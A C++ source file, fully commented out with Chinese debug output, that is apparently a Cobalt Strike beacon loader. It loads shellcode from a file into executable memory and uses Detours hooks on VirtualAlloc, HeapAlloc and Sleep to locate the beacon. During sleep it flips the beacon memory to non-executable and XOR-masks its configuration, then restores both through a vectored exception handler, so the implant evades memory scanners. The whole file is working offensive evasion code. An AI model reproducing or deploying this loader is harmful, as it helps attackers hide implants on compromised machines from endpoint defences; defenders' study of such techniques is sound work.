//
//#include "stdio.h"
//#include<Windows.h>
//#include <string.h>
//
//
//#include "./Detours/include/detours.h"
//#include "./Detours/include/detver.h"
//#pragma comment(lib,"./Detours/lib.X64/detours.lib")
//
//LPVOID* Beacon_config;
//SIZE_T Beacon_config_length=0x800;
//LPVOID Beacon_address;
//SIZE_T Beacon_data_len;
//DWORD Beacon_Memory_address_flOldProtect;
//HANDLE hEvent;
//
//
//BOOL Vir_FLAG = TRUE;
//LPVOID shellcode_addr;
//int count = 0;
//
//static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
//#if _MSC_VER < 1300
//static LPVOID(WINAPI*
//	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
//	= HeapAlloc;
//#else
//static LPVOID(WINAPI*
//	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
//	= HeapAlloc;
//#endif
//
//void xor_result(char* src, int length)
//{
//	for (int i = 0; i < length; i++)
//	{
//		src[i] ^= 0x4e;
//	}
//}
//
//#if _MSC_VER < 1300
//LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
//#else
//LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
//#endif
//
//{
//	LPVOID heapaddr;
//	if (dwBytes < 0x10000)
//		return OldHeapAlloc(hHeap, dwFlags, dwBytes);
//	else
//		heapaddr = OldHeapAlloc(hHeap, dwFlags, dwBytes);
//
//	printf("before len:%llx \n", dwBytes);
//	printf("before address:%p \n", heapaddr);
//	if (dwBytes == 0x800)
//	{
//		printf("HeapAlloc address:%p \n", heapaddr);
//		printf("HeapAlloc len:%llx \n", dwBytes);
//	}
//	return heapaddr;
//	//printf("arguements: %llx %llx %llx", hHeap, dwFlags, dwBytes);
//	//return heapaddr;
//	//if (heapaddr == 0)
//	//{
//	//	return NULL;
//	//}
//	//Beacon_address = heapaddr;
//	//Beacon_data_len = dwBytes;
//	//printf("分配大小:%d", Beacon_data_len);
//	//printf("分配地址:%llx \n", Beacon_address);
//	//return Beacon_address;
//}
//
//LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
//	if (dwSize != 0x4e000)
//		return OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
//	Beacon_data_len = dwSize;
//	Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
//	Beacon_config = (LPVOID *)((DWORD_PTR)Beacon_address + 0x47718);
//	printf("Beacon 分配大小:%llx\n", Beacon_data_len);
//	printf("Beacon 分配地址:%p \n", Beacon_address);
//	printf("Beacon_config 分配地址:%p \n", Beacon_config);
//	return Beacon_address;
//}
//
//static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
//void WINAPI NewSleep(DWORD dwMilliseconds)
//{
//	if (Vir_FLAG)
//	{
//		VirtualFree(shellcode_addr, 0, MEM_RELEASE);
//		Vir_FLAG = false;
//	}
//	printf("sleep时间:%d\n", dwMilliseconds);
//	SetEvent(hEvent);
//	OldSleep(dwMilliseconds);
//}
//
//void Hook()
//{
//	DetourRestoreAfterWith(); //避免重复HOOK
//	DetourTransactionBegin(); // 开始HOOK
//	DetourUpdateThread(GetCurrentThread());
//	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
//	DetourAttach((PVOID*)&OldHeapAlloc, NewHeapAlloc);
//
//	DetourAttach((PVOID*)&OldSleep, NewSleep);
//	DetourTransactionCommit(); //  提交HOOK
//}
//
//void UnHook()
//{
//	DetourTransactionBegin();
//	DetourUpdateThread(GetCurrentThread());
//	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
//	DetourDetach((PVOID*)&OldHeapAlloc, NewHeapAlloc);
//	DetourTransactionCommit();
//}
//
//
//
//BOOL is_Exception(DWORD64 Exception_addr)
//{
//	if (Exception_addr < ((DWORD64)Beacon_address + Beacon_data_len) && Exception_addr >(DWORD64)Beacon_address)
//	{
//		printf("地址符合:%llx\n", Exception_addr);
//		return true;
//	}
//	printf("地址不符合:%llx\n", Exception_addr);
//	return false;
//}
//
//LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
//{
//	printf("FirstVectExcepHandler\n");
//	printf("异常错误码:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
//	printf("线程地址:%llx\n", pExcepInfo->ContextRecord->Rip);
//	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
//	{
//		printf("恢复Beacon内存属性\n");
//		xor_result((char*)*Beacon_config, Beacon_config_length);
//		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
//
//		return EXCEPTION_CONTINUE_EXECUTION;
//	}
//	return EXCEPTION_CONTINUE_SEARCH;
//}
//
//DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)
//{
//	printf("Beacon_set_Memory_attributes启动\n");
//	while (true)
//	{
//		WaitForSingleObject(hEvent, INFINITE);
//		if (Beacon_address == 0 || Beacon_data_len == 0)
//		{
//			printf("Not find beacon now\n");
//			ResetEvent(hEvent);
//		}
//		else
//		{
//			printf("设置Beacon内存属性不可执行\n");
//			VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);
//			xor_result((char*)*Beacon_config, Beacon_config_length);
//			ResetEvent(hEvent);
//		}
//	}
//	return 0;
//}
//size_t GetSize(const char* szFilePath)
//{
//	size_t size;
//	FILE* f = fopen(szFilePath, "rb");
//	fseek(f, 0, SEEK_END);
//	size = ftell(f);
//	rewind(f);
//	fclose(f);
//	return size;
//}
//
//unsigned char* ReadBinaryFile(const char* szFilePath, size_t* size)
//{
//	unsigned char* p = NULL;
//	FILE* f = NULL;
//	size_t res = 0;
//	*size = GetSize(szFilePath);
//	if (*size == 0) return NULL;
//	f = fopen(szFilePath, "rb");
//	if (f == NULL)
//	{
//		printf("Binary file does not exists!\n");
//		return 0;
//	}
//	p = new unsigned char[*size];
//	// Read file
//	rewind(f);
//	res = fread(p, sizeof(unsigned char), *size, f);
//	fclose(f);
//	if (res == 0)
//	{
//		delete[] p;
//		return NULL;
//	}
//	return p;
//}
//
//
//
//
////47718
//int main()
//{
//	hEvent = CreateEvent(NULL, TRUE, false, NULL);
//
//	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
//	HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);
//	CloseHandle(hThread1);
//
//
//	LPVOID shellcode_addr;
//	DWORD Beacon_Memory_address_flOldProtect;
//	/* length: 892 bytes */
//	unsigned char* BinData = NULL;
//	size_t size = 0;
//	const char* szFilePath = "C:\\Users\\Lihua\\Desktop\\payload2.bin";
//	BinData = ReadBinaryFile(szFilePath, &size);
//	//BinData = strreplace(BinData, ori_malloc,patch_malloc)
//
//	shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	memcpy(shellcode_addr, BinData, size);
//	Hook();
//	VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
//	(*(int(*)()) shellcode_addr)();
//
//	UnHook();
//
//	return 0;
//}